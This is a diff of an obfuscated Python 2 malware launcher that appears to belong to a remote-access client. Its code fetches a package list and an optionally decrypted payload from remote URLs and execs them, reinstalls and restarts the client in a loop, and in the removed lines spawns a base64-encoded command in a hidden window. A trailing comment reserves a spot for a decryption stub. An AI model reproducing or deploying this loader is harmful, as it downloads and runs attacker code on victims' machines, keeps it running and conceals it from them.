@@ -44,7 +44,8 @@ def run(*args, **kwargs):
     else:
         try:
             os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
-            for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCat['t'][os.name][str(struct.calcsize('P') * 8)].items():
+            OrganicFecalOrigin = json.loads(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat['t'])).read()).get(os.name).get(str(struct.calcsize('P') * 8))
+            for FoamyNonstopHistory, NobleRusticWalrus in OrganicFecalOrigin.items():
                 if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                     RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                     if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
@@ -76,12 +77,8 @@ def run(*args, **kwargs):
                     SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
         finally:
             QuarrelsomeImportedAtom = decrypt(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()) if 'z' in AccidentalAquaticCat else urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
-            LyingIdioticManicure    = QuarrelsomeImportedAtom + ("\n\nif __name__ == '__main__':\n\tmain(**{%s})" % json.dumps(AccidentalAquaticCat))
-            EarnestUndulatingNipple = "python -c \"import base64;exec(base64.b64decode('''{}'''))\"".format(base64.b64encode(LyingIdiotManicure))
-            info                    = subprocess.STARTUPINFO()
-            info.dwFlags            = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
-            info.wShowWindow        = subprocess.SW_HIDE
-            return subprocess.Popen(EarnestUndulatingNipple, startupinfo=info, shell=True)
+            exec(QuarrelsomeImportedAtom + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))) in globals()
+            
 
 
 def main(*args, **kwargs):
@@ -94,18 +91,23 @@ def main(*args, **kwargs):
             sys.exit(0)
     if 'config' in kwargs:
         client = run(**kwargs)
-        if str(client).startswith('http'):
+        return client
+        if type(client) is str and client.startswith('http'):
             exec urllib.urlopen(client).read()
         elif hasattr(client, 'pid'):
             while True:
                 if client.poll():
                     if __DEBUG__:
                         print('restarting')
+                    time.sleep(1)
                     client = run(**kwargs)
                 else:
                     time.sleep(1)
+        else:
+            time.sleep(1)
+            return main(**kwargs)
 
-                    
 
-if __name__ == '__main__':
-    m = main(config=78810179473385211238)
+    
+# This line is reserved for the client to replace with a custom "if __name__ == '__main__'" statement with arguments to decrypt the launcher and configure the client.
+
